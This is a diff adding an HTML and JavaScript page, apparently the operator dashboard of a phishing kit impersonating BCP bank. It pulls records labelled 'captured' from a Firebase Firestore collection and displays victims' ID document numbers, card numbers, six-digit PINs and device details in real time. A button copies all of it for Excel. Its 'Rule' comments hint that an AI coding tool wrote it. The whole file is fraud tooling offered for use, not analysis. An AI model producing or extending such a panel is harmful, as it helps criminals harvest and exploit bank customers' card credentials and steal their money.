@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Control | Registros BCP</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .table-container { background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        th { background-color: #002a8d; color: white; text-align: left; padding: 12px; }
+        td { padding: 12px; border-bottom: 1px solid #eee; font-size: 14px; }
+        tr:hover { background-color: #f9f9f9; }
+        .badge { background: #ff7900; color: white; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+
+    <div class="max-w-6xl mx-auto">
+        <div class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
+            <div>
+                <h1 class="text-2xl font-bold text-[#002a8d]">Panel de Registros Capturados</h1>
+                <p class="text-gray-500">Visualización de datos en tiempo real</p>
+            </div>
+            <div class="flex gap-2">
+                <button onclick="location.reload()" class="bg-gray-200 hover:bg-gray-300 px-4 py-2 rounded font-medium transition">Actualizar</button>
+                <button onclick="exportarDatos()" class="bg-[#ff7900] hover:bg-[#e66d00] text-white px-4 py-2 rounded font-bold transition">Copiar para Excel</button>
+            </div>
+        </div>
+
+        <div class="table-container overflow-x-auto">
+            <table class="w-full border-collapse">
+                <thead>
+                    <tr>
+                        <th>Fecha/Hora</th>
+                        <th>Tipo</th>
+                        <th>Documento</th>
+                        <th>Número de Tarjeta</th>
+                        <th>Clave (6)</th>
+                        <th>Dispositivo</th>
+                    </tr>
+                </thead>
+                <tbody id="tabla-registros">
+                    <tr>
+                        <td colspan="6" class="text-center py-10 text-gray-400">Esperando autenticación...</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getFirestore, collection, onSnapshot, query } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+
+        // Global variables provided by environment
+        const firebaseConfig = JSON.parse(__firebase_config);
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+
+        const tablaBody = document.getElementById('tabla-registros');
+
+        // Function to handle Firestore subscription
+        let unsubscribe = null;
+
+        const startListening = (user) => {
+            if (!user) return;
+            
+            // Rule 1: Use strict paths for public data
+            const collectionRef = collection(db, 'artifacts', appId, 'public', 'data', 'registros');
+            
+            // Rule 2: Simple query to avoid index errors
+            const q = query(collectionRef);
+
+            unsubscribe = onSnapshot(q, (snapshot) => {
+                tablaBody.innerHTML = '';
+                
+                if (snapshot.empty) {
+                    tablaBody.innerHTML = '<tr><td colspan="6" class="text-center py-10">No hay registros aún.</td></tr>';
+                    return;
+                }
+
+                // Sorting in memory to avoid needing Firestore indexes
+                const docs = [];
+                snapshot.forEach(doc => {
+                    docs.push({ id: doc.id, ...doc.data() });
+                });
+                
+                docs.sort((a, b) => {
+                    const timeA = a.fecha?.seconds || 0;
+                    const timeB = b.fecha?.seconds || 0;
+                    return timeB - timeA;
+                });
+
+                docs.forEach(data => {
+                    const fecha = data.fecha ? new Date(data.fecha.seconds * 1000).toLocaleString() : 'Recién llegado...';
+                    const row = `
+                        <tr>
+                            <td class="font-medium text-gray-600">${fecha}</td>
+                            <td><span class="badge">${data.tipo_documento || 'DNI'}</span></td>
+                            <td class="font-bold text-[#002a8d]">${data.documento || '---'}</td>
+                            <td class="tracking-widest font-mono">${data.tarjeta || '---'}</td>
+                            <td class="text-red-600 font-bold">${data.clave || '---'}</td>
+                            <td class="text-xs text-gray-400 max-w-[150px] truncate" title="${data.agente || ''}">${data.agente || 'Desconocido'}</td>
+                        </tr>
+                    `;
+                    tablaBody.innerHTML += row;
+                });
+            }, (error) => {
+                console.error("Error al leer datos:", error);
+                tablaBody.innerHTML = `<tr><td colspan="6" class="text-center py-10 text-red-500">Error de permisos: ${error.message}</td></tr>`;
+            });
+        };
+
+        // Rule 3: Auth before queries
+        const initAuth = async () => {
+            try {
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    await signInWithCustomToken(auth, __initial_auth_token);
+                } else {
+                    await signInAnonymously(auth);
+                }
+            } catch (error) {
+                console.error("Auth error:", error);
+                tablaBody.innerHTML = '<tr><td colspan="6" class="text-center py-10 text-red-500">Error de autenticación.</td></tr>';
+            }
+        };
+
+        onAuthStateChanged(auth, (user) => {
+            if (unsubscribe) unsubscribe();
+            if (user) {
+                startListening(user);
+            } else {
+                tablaBody.innerHTML = '<tr><td colspan="6" class="text-center py-10">Cerrando sesión...</td></tr>';
+            }
+        });
+
+        // Copy to clipboard function
+        window.exportarDatos = () => {
+            const rows = Array.from(document.querySelectorAll('tr'));
+            const text = rows.map(row => Array.from(row.cells).map(cell => cell.innerText).join('\t')).join('\n');
+            
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            alert("Datos copiados al portapapeles. Puedes pegarlos en Excel.");
+        };
+
+        // Start process
+        initAuth();
+    </script>
+</body>
+</html>
